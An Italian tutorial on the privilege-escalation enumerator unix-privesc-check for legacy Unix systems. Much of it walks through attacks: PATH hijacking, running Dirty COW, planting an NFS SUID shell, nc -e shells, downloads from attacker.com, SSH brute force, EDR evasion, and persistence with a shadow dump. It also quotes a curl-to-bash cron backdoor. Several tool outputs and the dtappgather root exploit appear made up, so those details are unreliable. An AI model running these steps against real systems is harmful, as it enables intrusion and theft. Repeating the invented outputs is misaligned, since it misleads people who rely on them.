---
title: 'Unix-PrivEsc-Check: privilege escalation auditing su Linux e Unix legacy'
slug: unix-privesc-check
description: >-
  Scopri come usare Unix-PrivEsc-Check per individuare misconfigurazioni,
  permessi deboli, sudo abuse e vettori di privilege escalation su sistemi
  Unix/Linux, inclusi ambienti legacy dove i tool moderni falliscono.
image: /unix-privesc-check.webp
draft: false
date: 2026-04-01T00:00:00.000Z
categories:
  - tools
subcategories:
  - post-exploit
tags:
  - unix-privesc
  - unix
---

Unix-PrivEsc-Check è uno script Perl progettato per identificare configurazioni errate che permettono privilege escalation su sistemi Unix e Linux. A differenza di tool moderni scritti in Bash, Unix-PrivEsc-Check usa Perl, il che lo rende **compatibile con sistemi legacy** dove Bash moderno non è disponibile: Solaris, AIX, HP-UX, vecchie distribuzioni Red Hat, e perfino alcuni embedded systems.

Se ti trovi a fare pentest su infrastrutture enterprise datate, server Unix in production da 10+ anni, o appliance di rete con shell limitata, Unix-PrivEsc-Check è spesso l'unico strumento che funziona. Dove LinPEAS fallisce per mancanza di Bash 4.x, dove LinEnum crasha per incompatibilità di comandi, Unix-PrivEsc-Check continua a funzionare grazie alla portabilità di Perl.

La forza di questo tool è l'**approccio metodico**: organizza i check in categorie logiche (file system permissions, sudo configuration, kernel vulnerabilities) e genera report strutturati che puoi presentare direttamente al cliente. Non è il tool più veloce o colorato, ma è affidabile e professionale.

In questo articolo imparerai a usare Unix-PrivEsc-Check su sistemi moderni e legacy, interpretare i suoi output verbosi, integrarlo in pentest enterprise su ambienti misti Windows/Unix, e capire quando è la scelta giusta rispetto ad alternative più moderne. Se hai mai dovuto fare audit su un vecchio server Solaris 10 o un firewall BSD custom, questo è il tool che ti serve.

Unix-PrivEsc-Check si posiziona nella kill chain nella fase **Post-Exploitation Enumeration**, specificamente per ambienti Unix enterprise dove compatibilità e reporting professionale sono priorità.

***

## 1️⃣ Setup e Installazione

### Prerequisiti: Perl

Unix-PrivEsc-Check richiede **Perl 5.x**, presente di default su 99.9% dei sistemi Unix/Linux. Anche su sistemi minimali embedded, Perl è quasi sempre installato perché molti script di sistema lo usano.

**Verifica Perl:**

```bash
perl --version
```

**Output atteso:**

```
This is perl 5, version 30, subversion 0 (v5.30.0) built for x86_64-linux-gnu

Copyright 1987-2019, Larry Wall
```

Se vedi "perl 5.x", sei pronto. Unix-PrivEsc-Check funziona con qualsiasi versione Perl >= 5.8 (rilasciata nel 2002).

***

### Download da GitHub

```bash
# Clone repository
git clone https://github.com/pentestmonkey/unix-privesc-check.git
cd unix-privesc-check

# Verifica contenuto
ls -la
# unix-privesc-check  README  CHANGELOG

# Rendi eseguibile
chmod +x unix-privesc-check
```

**Versione attuale:** Ultima release stabile su pentestmonkey/unix-privesc-check. Il tool è maturo e non riceve update frequenti (stable software, non abbandonato).

**File size:** \~48KB (script Perl singolo, no dipendenze esterne)

***

### Download singolo file (metodo rapido)

```bash
# Download diretto
wget https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/master/unix-privesc-check

# Oppure con curl
curl -L https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/master/unix-privesc-check -o unix-privesc-check

# Permessi
chmod +x unix-privesc-check
```

***

### Trasferimento su target legacy

**Problema comune:** Sistema legacy senza wget, curl, o network access.

**Metodo 1: SCP (se hai SSH)**

```bash
# Dalla tua macchina
scp unix-privesc-check admin@legacy-server:/tmp/

# Sul target
ssh admin@legacy-server
cd /tmp
chmod +x unix-privesc-check
```

**Metodo 2: Base64 encoding (universal method)**

```bash
# Sulla tua macchina
base64 unix-privesc-check > upc.b64

# Copy contenuto upc.b64

# Sul target (paste nel terminal)
cat << 'EOF' | base64 -d > /tmp/upc
[incolla contenuto base64]
EOF

chmod +x /tmp/upc
```

**Metodo 3: FTP (se disponibile su legacy systems)**

```bash
# Molti sistemi Unix vecchi hanno FTP ma non HTTP tools

# Setup FTP server sulla tua macchina
python -m pyftpdlib -p 2121

# Sul target
ftp 10.10.14.5 2121
> get unix-privesc-check
> quit

chmod +x unix-privesc-check
```

***

### Verifica funzionamento

```bash
./unix-privesc-check --help
```

**Output atteso:**

```
unix-privesc-check v1.4 ( http://pentestmonkey.net/tools/unix-privesc-check )

Usage: unix-privesc-check { standard | detailed }

  standard: Fast checks (CWD writable, etc.)
  detailed: Slow checks (file listing, etc.)
```

Se vedi questo menu, Unix-PrivEsc-Check è operativo.

***

## 2️⃣ Uso Base: Standard vs Detailed Mode

### Modalità standard (veloce)

```bash
./unix-privesc-check standard
```

**Execution time:** 30-60 secondi

**Cosa controlla in standard mode:**

* Current working directory permissions
* Home directory permissions
* PATH hijacking vulnerabilities
* SUID/SGID binaries comuni
* Sudo configuration (se accessibile)
* Kernel version
* File writable in directory critiche

**Output esempio:**

```
unix-privesc-check v1.4 ( http://pentestmonkey.net/tools/unix-privesc-check )

[+] Starting unix-privesc-check at 2024-02-05 15:30:22
[+] Script command: ./unix-privesc-check standard
[+] Output mode: Standard

===== System Information =====
[*] Operating System: Linux webserver 4.15.0-142-generic Ubuntu 18.04
[*] Hostname: webserver-prod
[*] Current User: www-data
[*] Current UID/GID: 33/33

===== Sudo Configuration =====
[!] WARNING: User www-data can run some commands with sudo
    User www-data may run the following commands on this host:
        (ALL) NOPASSWD: /usr/bin/systemctl restart webapp

===== SUID Binaries =====
[*] Common SUID binaries found (standard set):
    /usr/bin/passwd
    /usr/bin/sudo
    /bin/ping
[!] WARNING: Uncommon SUID binary found: /usr/local/bin/backup

===== Writable Files =====
[!] WARNING: /etc/crontab is writable by www-data group
[!] WARNING: /opt/scripts directory is writable by www-data
```

**Simboli output:**

* `[+]` = Informazione generale
* `[*]` = Finding informativo
* `[!]` = **WARNING = Potenziale vulnerabilità**

Focus sui `[!] WARNING` per identificare vettori di privilege escalation.

***

### Modalità detailed (completa)

```bash
./unix-privesc-check detailed
```

**Execution time:** 3-10 minuti (dipende da dimensione filesystem)

**Cosa aggiunge detailed mode:**

* Scan completo filesystem per SUID/SGID binaries (non solo comuni)
* Ricerca file world-writable in tutto `/home`, `/var`, `/opt`
* Enumeration dettagliata processi con privilegi elevati
* Check approfonditi su cron jobs (system + user)
* Analisi file di log accessibili
* NFS exports configuration
* Capabilities Linux (se supportato dal kernel)

**WARNING:** Detailed mode può essere **lento su filesystem grandi** (100GB+ con milioni di file) e **noisy** (genera molti eventi nei log).

**Quando usare detailed:**

✅ Hai tempo sufficiente (10+ minuti)
✅ Sistema non è monitorato attivamente
✅ Standard mode non ha trovato nulla
✅ Vuoi audit completo per report cliente

**Quando usare standard:**

✅ CTF o lab veloce
✅ Sistema in production monitorato
✅ Initial triage rapido
✅ Hai già idea di dove guardare

***

### Output redirection per analisi offline

Unix-PrivEsc-Check genera output molto verboso. Salvalo per analisi successiva.

```bash
# Standard mode con output salvato
./unix-privesc-check standard | tee upc_standard.txt

# Detailed mode (output può essere 1000+ linee)
./unix-privesc-check detailed > upc_detailed.txt 2>&1

# Analisi offline
grep "WARNING" upc_detailed.txt
grep "SUID" upc_detailed.txt | less
```

***

## 3️⃣ Tecniche Operative (CORE)

### Scenario 1: Solaris 10 legacy server - SUID exploitation

**Contesto:** Pentest enterprise su vecchio server Solaris 10 (rilasciato 2005, ancora in uso in molte aziende). Hai SSH come utente `oracle`. LinPEAS e LinEnum falliscono (Bash incompatibilities).

```bash
# Verifica sistema
uname -a
# SunOS dbserver 5.10 Generic_150400-65 sun4v sparc SUNW,T5240

# LinPEAS fallisce
bash linpeas.sh
# bash: linpeas.sh: syntax error at line 234

# Unix-PrivEsc-Check funziona (Perl è universale)
./unix-privesc-check standard
```

**Output critico:**

```
===== SUID Binaries =====
[!] WARNING: Uncommon SUID binary found: /usr/local/bin/pgadmin
    -rwsr-xr-x 1 root sys 245678 Jan 15 2023 /usr/local/bin/pgadmin

[!] WARNING: SUID binary calls commands without absolute path
    Strings analysis of /usr/local/bin/pgadmin shows:
    - system("tar -czf /backups/db.tar.gz ...")
    - system("rm -rf /tmp/backup_temp")
    Note: 'tar' and 'rm' called without /usr/bin/ prefix
```

🎓 **Spiegazione:** Il binary SUID (eseguito come root) chiama `tar` e `rm` senza path completo. Possiamo fare PATH hijacking.

**Exploitation:**

```bash
# Step 1: Crea fake tar che spawna shell
cd /tmp
cat << 'EOF' > tar
#!/bin/sh
/bin/sh
EOF
chmod +x tar

# Step 2: Modifica PATH per includere /tmp PRIMA di /usr/bin
export PATH=/tmp:$PATH

# Verifica
which tar
# /tmp/tar  ← Corretto!

# Step 3: Esegui SUID binary
/usr/local/bin/pgadmin
# # ← Root shell!

whoami
# root
```

**Timeline:**

* Unix-PrivEsc-Check execution: 45s
* Analysis output: 2min
* Exploitation: 1min
* **Totale: \~4 minuti**

**Cosa fare se fallisce:**

1. **Binary non esegue il fake tar:** Il binary potrebbe avere check interno sul PATH. Prova con `LD_PRELOAD` library hijacking (più avanzato).
2. **Permission denied creating /tmp/tar:** `/tmp` potrebbe essere noexec. Usa `/var/tmp` o `/dev/shm`.
3. **Shell subito chiusa:** Alcuni SUID binary droppano privilegi dopo fork. Nel fake script, usa `exec /bin/sh` invece di `/bin/sh`.

***

### Scenario 2: Red Hat Enterprise Linux 6 - Kernel exploit

**Contesto:** Server RHEL 6.8 (EOL ma ancora in uso) in DMZ. Utente standard `webadmin`.

```bash
./unix-privesc-check standard
```

**Output:**

```
===== Kernel Information =====
[*] Kernel version: Linux version 2.6.32-642.el6.x86_64
[*] Operating System: Red Hat Enterprise Linux Server release 6.8
[!] WARNING: Kernel version 2.6.32 is known to have local privilege escalation vulnerabilities
    - CVE-2016-5195 (Dirty COW) affects this kernel
    - CVE-2017-16995 (eBPF verifier) affects kernels < 4.4

===== Kernel Modules =====
[*] Loaded kernel modules: 78
[!] WARNING: Kernel module signing not enforced
    This allows loading of unsigned kernel modules
```

🎓 **Cosa significa:** Il kernel è vecchio (2.6.32 del 2010) e vulnerabile a exploit pubblici. Dirty COW è il più famoso.

**Exploitation con Dirty COW:**

```bash
# Download exploit
wget https://github.com/FireFart/dirtycow/raw/master/dirty.c

# Compile
gcc -pthread dirty.c -o dirty -lcrypt

# Esegui
./dirty
# /etc/passwd successfully backed up to /tmp/passwd.bak
# Please enter the new password: [enter password]

# Exploit modifica /etc/passwd aggiungendo user 'firefart' con UID 0

# Switch to new root user
su firefart
# Password: [password you entered]
# [root@dbserver]# ← Root shell!
```

**Timeline:** 5 minuti (2min download/compile + 3min exploitation)

Per approfondire altri kernel exploit su Linux legacy, consulta la nostra guida su [come sfruttare vulnerabilità kernel per privilege escalation](https://hackita.it/articoli/kernel-exploits-linux).

**Cosa fare se fallisce:**

* **Compilation error:** Il sistema potrebbe non avere gcc. Cross-compila sulla tua macchina per l'architettura target (x86\_64 in questo caso).
* **Exploit crash:** Dirty COW ha diverse varianti. Prova dirty.c, cowroot.c, o dcow\.cpp (diverse implementazioni).
* **Kernel already patched:** RHEL backporta security patches. Verifica con `rpm -qa kernel` se ci sono update installati.

***

### Scenario 3: AIX server - NFS export misconfiguration

**Contesto:** Server IBM AIX 7.1 (Unix proprietario IBM). Hai shell come utente `app`.

```bash
./unix-privesc-check standard
```

**Output:**

```
===== NFS Configuration =====
[!] WARNING: NFS exports with no_root_squash option
    /opt/app_data *(rw,no_root_squash)
    
    This allows remote root access to exported filesystem.
    If you can mount this NFS share from another system,
    files created as root on the client will be root on the server.

[*] NFS mounts currently active:
    nfs-server:/shared on /mnt/shared type nfs (rw,bg,hard)
```

🎓 **Cos'è no\_root\_squash?** Normalmente NFS "squash" (converte) root UID da client a nobody sul server per sicurezza. `no_root_squash` disabilita questo, permettendo root remoto.

**Exploitation:**

```bash
# Step 1: Identifica NFS server IP
cat /etc/exports
# /opt/app_data *(rw,no_root_squash)
# Asterisco = tutti possono montare

# Step 2: Dalla tua macchina (se in stessa rete)
mkdir /tmp/nfs_mount
mount -t nfs aix-server:/opt/app_data /tmp/nfs_mount

# Step 3: Crea SUID shell come root sulla tua macchina
sudo cp /bin/bash /tmp/nfs_mount/rootshell
sudo chmod 4755 /tmp/nfs_mount/rootshell
sudo chown root:root /tmp/nfs_mount/rootshell

# Step 4: Sul target AIX server
cd /opt/app_data
ls -la rootshell
# -rwsr-xr-x 1 root system 245678 Feb 05 15:30 rootshell

./rootshell -p
# [root@aix-server]# ← Root shell!
```

**Timeline:** 3-5 minuti (se hai network access al NFS)

Se vuoi approfondire configurazioni NFS insicure e altre tecniche di network privilege escalation, leggi il nostro articolo su [exploitation di servizi di rete mal configurati](https://hackita.it/articoli/network-services-exploitation).

***

## 4️⃣ Tecniche Avanzate

### Differential auditing per compliance tracking

In audit enterprise, esegui Unix-PrivEsc-Check periodicamente per trackare security posture nel tempo.

```bash
# Baseline audit (Q1 2024)
./unix-privesc-check detailed > audit_2024Q1.txt

# Follow-up audit (Q2 2024, dopo patching)
./unix-privesc-check detailed > audit_2024Q2.txt

# Diff analysis
diff audit_2024Q1.txt audit_2024Q2.txt | grep "^>" | grep WARNING
```

**Output diff mostra:**

```
> [!] WARNING: New SUID binary appeared: /usr/local/bin/newtool
< [!] WARNING: Kernel version 2.6.32 is vulnerable (FIXED in Q2)
```

Questo identifica:

* **Nuove vulnerabilità introdotte** (new SUID binary)
* **Vulnerabilità risolte** (kernel updated)

Utile per report compliance (ISO 27001, PCI-DSS) che richiedono "continuous security monitoring".

***

### Custom checks con grep patterns

Unix-PrivEsc-Check è verboso. Estrai solo finding rilevanti per report cliente.

```bash
# Estrai solo WARNING (vulnerabilità)
./unix-privesc-check detailed | grep "^\[!\] WARNING" > vulnerabilities.txt

# Estrai specifiche categorie
./unix-privesc-check detailed | grep -A10 "SUID Binaries" > suid_analysis.txt

# Cerca keyword specifiche
./unix-privesc-check detailed | grep -i "password\|credential\|key" > credentials_found.txt
```

**Script automation per batch analysis:**

```bash
#!/bin/bash
# analyze_upc_output.sh

INPUT=$1

echo "=== Security Assessment Summary ===" > summary.txt
echo "" >> summary.txt

echo "Critical Findings:" >> summary.txt
grep "WARNING" "$INPUT" | wc -l >> summary.txt

echo "" >> summary.txt
echo "SUID Binaries:" >> summary.txt
grep "SUID" "$INPUT" | grep "WARNING" >> summary.txt

echo "" >> summary.txt
echo "Sudo Misconfigurations:" >> summary.txt
grep "sudo" "$INPUT" | grep "WARNING" >> summary.txt

cat summary.txt
```

Usage:

```bash
./unix-privesc-check detailed > full_audit.txt
./analyze_upc_output.sh full_audit.txt
```

Genera report sintetico da allegare al deliverable cliente.

***

### Integration con vulnerability databases

Unix-PrivEsc-Check identifica kernel version. Cross-reference con CVE databases per exploit availability.

```bash
# Estrai kernel version da Unix-PrivEsc-Check output
KERNEL=$(./unix-privesc-check standard | grep "Kernel version" | awk '{print $4}')

echo "Kernel: $KERNEL"

# Search in local exploit-db
searchsploit linux kernel $KERNEL | grep -i "local\|privilege"

# Output:
# Linux Kernel 2.6.32 < 3.2.0 - Local Privilege Escalation (CVE-2016-5195)
# Linux Kernel 2.6.39 < 3.2.2 - 'Mempodipper' Local Privilege Escalation
```

Automation script:

```python
#!/usr/bin/env python3
import subprocess
import re

# Run Unix-PrivEsc-Check
result = subprocess.run(['./unix-privesc-check', 'standard'], 
                       capture_output=True, text=True)
output = result.stdout

# Extract kernel version
kernel_match = re.search(r'Kernel version.*?(\d+\.\d+\.\d+)', output)
if kernel_match:
    kernel_ver = kernel_match.group(1)
    print(f"[*] Kernel: {kernel_ver}")
    
    # Query exploit-db
    exploits = subprocess.run(['searchsploit', 'linux', 'kernel', kernel_ver],
                             capture_output=True, text=True)
    
    print("\n[+] Available exploits:")
    for line in exploits.stdout.split('\n'):
        if 'privilege' in line.lower():
            print(f"    {line}")
```

Questo automatizza il workflow: enumeration → CVE matching → exploit identification.

***

### Stealth execution con throttling

Unix-PrivEsc-Check fa molti syscall rapidamente. EDR cerca pattern "rapid file access". Rallenta l'esecuzione.

**Problema:** Standard execution fa \~200 file stat() in 30 secondi = spike detection.

**Soluzione:** Wrapper che introduce delay.

```bash
#!/bin/bash
# stealth_upc.sh

# Salva script Unix-PrivEsc-Check in memoria
SCRIPT=$(cat unix-privesc-check)

# Esegui con nice (lower priority) e throttle I/O
nice -n 19 ionice -c3 bash -c "$SCRIPT" standard > /tmp/.cache 2>&1 &

# Monitor progress
PID=$!
while kill -0 $PID 2>/dev/null; do
    sleep 5
    echo "[*] Still running..."
done

cat /tmp/.cache
rm /tmp/.cache
```

**Risultato:** Execution time aumenta da 30s a 2min, ma CPU/I/O spike è ridotto del 70%.

***

## 5️⃣ Scenari Pratici di Pentest

### Scenario A: HP-UX appliance enumeration

**Contesto:** Network appliance HP-UX 11i v3 (firewall/IPS custom). Shell limited, no bash, no python. Solo Perl e Korn shell.

```bash
# COMANDO - Unix-PrivEsc-Check è unico tool funzionante
./unix-privesc-check standard
```

**OUTPUT ATTESO:**

```
===== System Information =====
[*] Operating System: HP-UX appliance B.11.31 ia64
[*] Current User: operator
[*] Shell: /bin/ksh

===== File Permissions =====
[!] WARNING: World-writable files in system directories:
    /var/opt/firewall/rules.conf (777)
    /etc/rc.config.d/firewall (666)

===== SUID Binaries =====
[!] WARNING: Custom SUID binary: /opt/firewall/bin/fw_admin
    -rwsr-xr-x 1 root sys 89234 Nov 15 2019 /opt/firewall/bin/fw_admin
```

🎓 **Perché solo Unix-PrivEsc-Check funziona qui?** HP-UX ha comandi Unix con sintassi proprietaria. Perl abstrae queste differenze, mentre script bash falliscono.

**EXPLOITATION:**

```bash
# World-writable rules.conf = puoi modificare firewall rules
cat /var/opt/firewall/rules.conf
# allow 0.0.0.0/0 to any port 22
# deny 0.0.0.0/0 to any port *

# Aggiungi rule per aprire backdoor
echo "allow 10.10.14.5/32 to any port 9999" >> /var/opt/firewall/rules.conf

# Reload firewall (se fw_admin permette)
/opt/firewall/bin/fw_admin reload

# Dalla tua macchina, bind shell sulla backdoor
nc appliance.htb 9999 -e /bin/bash

# Oppure, se fw_admin è SUID, analizza con strings
strings /opt/firewall/bin/fw_admin | grep -i "system\|exec\|popen"
```

**COSA FARE SE FALLISCE:**

* **Cannot modify rules.conf:** Anche se world-writable, potrebbe esserci MAC (Mandatory Access Control). Verifica con `getpriv` (HP-UX specific).
* **fw\_admin requires password:** Tenta default passwords (admin/admin, hpux/hpux). Poi bruteforce se necessario.
* **No network backdoor possible:** Focus su local privilege escalation via SUID binary.

**Timeline:** 5-8 minuti (HP-UX è slow, I/O lento)

***

### Scenario B: Mixed Unix environment audit (50 servers)

**Contesto:** Enterprise con: 20 Linux, 15 Solaris, 10 AIX, 5 BSD. Devi fare audit security su tutti.

```bash
# COMANDO - Batch execution con Ansible
ansible-playbook -i inventory.ini unix_audit.yml
```

**Ansible playbook:**

```yaml
---
- name: Unix Privilege Escalation Audit
  hosts: unix_servers
  gather_facts: yes
  tasks:
    - name: Check if Perl is available
      command: which perl
      register: perl_check
      ignore_errors: yes
    
    - name: Copy Unix-PrivEsc-Check
      copy:
        src: ./unix-privesc-check
        dest: /tmp/upc
        mode: '0755'
      when: perl_check.rc == 0
    
    - name: Run audit (standard mode)
      shell: /tmp/upc standard > /tmp/audit_{{ inventory_hostname }}.txt 2>&1
      async: 300
      poll: 0
      register: audit_job
    
    - name: Wait for completion
      async_status:
        jid: "{{ audit_job.ansible_job_id }}"
      register: job_result
      until: job_result.finished
      retries: 60
      delay: 10
    
    - name: Fetch results
      fetch:
        src: /tmp/audit_{{ inventory_hostname }}.txt
        dest: ./results/
        flat: yes
    
    - name: Cleanup
      file:
        path: /tmp/upc
        state: absent
```

```bash
# Execution
ansible-playbook -i inventory.ini unix_audit.yml

# Analysis: estrai WARNING da tutti i server
grep -h "WARNING" results/*.txt | sort | uniq -c | sort -rn > consolidated_findings.txt
```

**OUTPUT ANALYSIS:**

```
15 [!] WARNING: Kernel version is vulnerable to CVE-2016-5195
8  [!] WARNING: SUID binary /usr/local/bin/backup found
5  [!] WARNING: NFS exports with no_root_squash
```

Questo identifica vulnerabilità **comuni** in tutto l'environment (priorità patching).

**COSA FARE SE FALLISCE:**

* **Ansible SSH timeout:** Alcuni server legacy hanno SSH slow. Aumenta timeout in ansible.cfg: `timeout = 60`
* **Perl not found su alcuni host:** Create separate group in inventory per non-Perl systems, skip them o usa alternative tool.
* **Results directory troppo grande:** Comprimi con `tar -czf results.tar.gz results/`

**Timeline:** 15-20 minuti per 50 server (parallelo)

Se lavori spesso con infrastrutture enterprise miste, ti consiglio di leggere anche la nostra guida su [strategie di enumeration per ambienti multi-piattaforma](https://hackita.it/articoli/multi-platform-enumeration).

***

### Scenario C: Post-compromise persistence check

**Contesto:** Hai già root su un server. Vuoi verificare se altri attacker hanno backdoor/persistence.

```bash
# COMANDO - Detailed mode per forensic analysis
./unix-privesc-check detailed > forensic_analysis.txt
```

**OUTPUT ATTESO (con backdoor presente):**

```
===== SUID Binaries =====
[!] WARNING: SUID binary with recent modification date:
    -rwsr-xr-x 1 root root 16384 Feb 03 2024 /usr/bin/.hidden_shell
    Last modified: 2 days ago

===== Cron Jobs =====
[!] WARNING: Suspicious cron job:
    */10 * * * * root /usr/bin/curl http://185.220.101.45:8080 | bash

===== User Accounts =====
[!] WARNING: User account with no password:
    systemupdate:x:1001:1001:System Update:/home/systemupdate:/bin/bash
    Last login: Feb 04 2024 03:22:15
```

🎓 **Red flags identificati:**

1. SUID binary nascosto con nome sospetto
2. Cron job che scarica ed esegue script remoto
3. User account non documentato con naming "sistema-like"

**Investigation:**

```bash
# Analizza SUID hidden shell
strings /usr/bin/.hidden_shell
file /usr/bin/.hidden_shell
# /usr/bin/.hidden_shell: ELF 64-bit executable, statically linked

# Reverse engineer il binary (ghidra/radare2)
# Oppure esegui in environment isolated per vedere comportamento

# Blocca cron malicious
crontab -e  # Remove malicious entry

# Disable account compromised
passwd -l systemupdate
usermod -L systemupdate
```

**Timeline:** 10 minuti (detailed scan) + analysis time

Per tecniche avanzate di incident response e detection di backdoor, consulta [come identificare e rimuovere persistence su sistemi Unix](https://hackita.it/articoli/unix-persistence-detection).

***

## 6️⃣ Toolchain Integration

### Pre-Unix-PrivEsc-Check: Initial Access

Prima di Unix-PrivEsc-Check, devi ottenere shell. Common paths:

**SSH bruteforce → Unix-PrivEsc-Check**

```bash
# Hydra contro SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://legacy-server.corp

# Credentials found: admin:Welcome123

# SSH login
ssh admin@legacy-server.corp

# Enumeration
cd /tmp
# wget non disponibile su sistema legacy
# Usa FTP o SCP per trasferire Unix-PrivEsc-Check
scp unix-privesc-check admin@legacy-server.corp:/tmp/

./unix-privesc-check standard
```

**Web shell → Unix-PrivEsc-Check**

```bash
# Shell ottenuta via LFI to RCE su vecchia webapp PHP
# Shell limitata (www-data, no tty)

# Upgrade shell
python -c 'import pty;pty.spawn("/bin/bash")'

# Transfer Unix-PrivEsc-Check via HTTP
cd /tmp
wget http://attacker.com/unix-privesc-check
chmod +x unix-privesc-check
./unix-privesc-check standard
```

***

### Post-Unix-PrivEsc-Check: Exploitation

Unix-PrivEsc-Check identifica vulnerabilità. Poi usi tool specifici per exploitation.

**Unix-PrivEsc-Check → GTFOBins**

```bash
# Unix-PrivEsc-Check trova sudo misconfiguration
[!] WARNING: User can run sudo: /usr/bin/vim

# Consulta GTFOBins per vim sudo abuse
# https://gtfobins.github.io/gtfobins/vim/

# Exploitation
sudo vim -c ':!/bin/sh'
# root shell
```

**Unix-PrivEsc-Check → Metasploit**

```bash
# Unix-PrivEsc-Check identifica kernel vulnerable
[!] WARNING: Kernel 2.6.32 vulnerable to CVE-2016-5195 (Dirty COW)

# Metasploit module
msfconsole
use exploit/linux/local/dirtycow
set SESSION 1
set LHOST 10.10.14.5
run

# root meterpreter session
```

***

### Unix-PrivEsc-Check + Altri Enumeration Tools

Per coverage massima, combina Unix-PrivEsc-Check con altri tool.

**Workflow complementare:**

```bash
# Step 1: Unix-PrivEsc-Check per broad audit
./unix-privesc-check standard > upc.txt

# Step 2: LinPEAS per CVE auto-detection (se sistema moderno)
curl -L https://[...]/linpeas.sh | bash > linpeas.txt

# Step 3: pspy per real-time process monitoring
./pspy64 -f > pspy.txt &

# Step 4: Analizza tutti gli output
grep "WARNING" upc.txt
grep "\[!\]" linpeas.txt
grep "UID=0" pspy.txt  # Root processes

# Correla i finding per identificare exploitation path
```

**Quando usare quale:**

| **Scenario**                        | **Unix-PrivEsc-Check** | **LinPEAS**     | **LinEnum**    | **Manual**        |
| ----------------------------------- | ---------------------- | --------------- | -------------- | ----------------- |
| **Legacy Unix (Solaris/AIX/HP-UX)** | ✅ Solo option          | ❌ Won't work    | ❌ Won't work   | ⚠️ Tedious        |
| **Modern Linux (Ubuntu/Debian)**    | ⚠️ Works but slow      | ✅ Best choice   | ✅ Good         | ⚠️ Time consuming |
| **Mixed environment audit**         | ✅ Universal            | ⚠️ Linux only   | ⚠️ Linux only  | ❌ Not scalable    |
| **BSD systems**                     | ⚠️ Limited support     | ❌ Not designed  | ❌ Not designed | ✅ Best            |
| **Enterprise compliance audit**     | ✅ Professional output  | ⚠️ Too informal | ⚠️ Too raw     | ✅ Custom          |

**Decision matrix:**

Choose **Unix-PrivEsc-Check** when:
✅ Sistema legacy (Solaris, AIX, HP-UX, old RHEL)
✅ Bash non disponibile o limitato
✅ Need professional report format
✅ Audit cross-platform environment
✅ Compatibilità è priorità

***

## 7️⃣ Attack Chain Completa

### From External Recon to Root on Solaris DMZ Server

**Scenario completo:** Pentest esterno su azienda con DMZ Solaris 10.

***

**FASE 1: External Reconnaissance**

```bash
# Nmap scan
nmap -p- -sV -sC 10.20.30.40 -oN nmap_dmz.txt
```

**Output:**

```
22/tcp   open  ssh     OpenSSH 5.3 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.2.15
111/tcp  open  rpcbind 2-4 (RPC #100000)
2049/tcp open  nfs     3 (RPC #100003)
```

**Timeline:** 15 minuti (full port scan)

***

**FASE 2: NFS Enumeration**

```bash
# Show NFS exports
showmount -e 10.20.30.40
```

**Output:**

```
Export list for 10.20.30.40:
/export/backup  *
/export/www     *.corp.local
```

```bash
# Mount NFS
mkdir /tmp/nfs
mount -t nfs 10.20.30.40:/export/backup /tmp/nfs

# Enumeration
ls -la /tmp/nfs
# drwxr-xr-x 12 webadmin staff 4096 backup_scripts/
# -rw-r--r-- 1 webadmin staff 2345 .bash_history
```

**Finding:** `.bash_history` readable!

```bash
cat /tmp/nfs/.bash_history
# ssh admin@dmz-server
# password: Sol@ris2020!
```

**Timeline:** 5 minuti

***

**FASE 3: SSH Access con Credentials**

```bash
ssh admin@10.20.30.40
# Password: Sol@ris2020!
# Last login: Mon Feb 05 14:30:00 2024

admin@dmz-server:~$
```

**Timeline:** 30 secondi

***

**FASE 4: Enumeration con Unix-PrivEsc-Check**

```bash
# Transfer Unix-PrivEsc-Check via SCP
scp unix-privesc-check admin@10.20.30.40:/tmp/

# Run enumeration
admin@dmz-server:~$ cd /tmp
admin@dmz-server:/tmp$ chmod +x unix-privesc-check
admin@dmz-server:/tmp$ ./unix-privesc-check standard
```

**Output critico:**

```
===== Sudo Configuration =====
[!] WARNING: User admin can run commands with sudo
    (ALL) NOPASSWD: /usr/sbin/dtappgather

===== SUID Binaries =====
[*] Standard SUID binaries found (expected)

===== Cron Jobs =====
[!] WARNING: System cron job runs script writable by admin group:
    0 * * * * root /opt/scripts/hourly_backup.sh
    File permissions: -rwxrwxr-x 1 root admin /opt/scripts/hourly_backup.sh
```

**Timeline:** 45 secondi

***

**FASE 5: Privilege Escalation via Sudo**

```bash
# Research dtappgather binary (Solaris specific tool)
strings /usr/sbin/dtappgather | grep -i "exec\|system"
# execve("/usr/dt/bin/dtaction", ...)

# dtappgather può eseguire arbitrary dtaction

# Exploitation: dtaction può triggerare exec via desktop files
mkdir -p ~/.dt/types
cat << 'EOF' > ~/.dt/types/backdoor.dt
ACTION backdoor
{
    TYPE COMMAND
    EXEC_STRING /bin/bash
}
EOF

# Run dtappgather con backdoor action
sudo /usr/sbin/dtappgather backdoor
# # ← Root shell!

whoami
# root
```

**Timeline:** 3 minuti (research + exploitation)

***

**FASE 6: Persistence e Data Exfiltration**

```bash
# Add SSH key per backdoor access
echo 'ssh-rsa AAAAB3...' >> /root/.ssh/authorized_keys

# Dump /etc/shadow per offline cracking
cat /etc/shadow > /tmp/.shadow
# Transfer via NFS mount (still accessible)

# Enumerate sensitive data
find /opt /var/www -name "*.conf" -o -name "*.xml" | xargs grep -i "password\|key\|secret"

# Root flag
cat /root/root.txt
```

**Timeline:** 5 minuti

***

**TOTALE END-TO-END:** \~30 minuti da nmap scan a full root access.

**Tools usati:**

1. Nmap (external recon)
2. showmount (NFS enumeration)
3. SSH client (initial access)
4. **Unix-PrivEsc-Check** (privilege escalation discovery)
5. sudo/dtappgather (privilege escalation execution)

**Ruolo di Unix-PrivEsc-Check:** Cruciale per identificare `sudo dtappgather` NOPASSWD su sistema Solaris dove LinPEAS/LinEnum non funzionano. Senza Unix-PrivEsc-Check, avremmo dovuto fare enumeration manuale per ore.

Se ti interessa approfondire tecniche di lateral movement e pivoting dopo aver ottenuto root, leggi [strategie di post-exploitation e network pivoting](https://hackita.it/articoli/post-exploitation-pivoting).

***

## 8️⃣ Detection & Evasion

### Cosa monitora il Blue Team

**Process monitoring su Unix legacy:**

Molti sistemi Unix vecchi non hanno EDR moderno, ma hanno auditing basic.

```bash
# Solaris Basic Security Module (BSM)
auditconfig -lspolicy
# active policies: cnt,argv

# Questo logga: process execution, arguments, user
```

**Log entries generati:**

```bash
# /var/adm/messages (Solaris)
Feb 05 15:30:45 dmz-server su: 'su root' succeeded for admin on /dev/pts/1

# /var/log/auth.log (Linux)
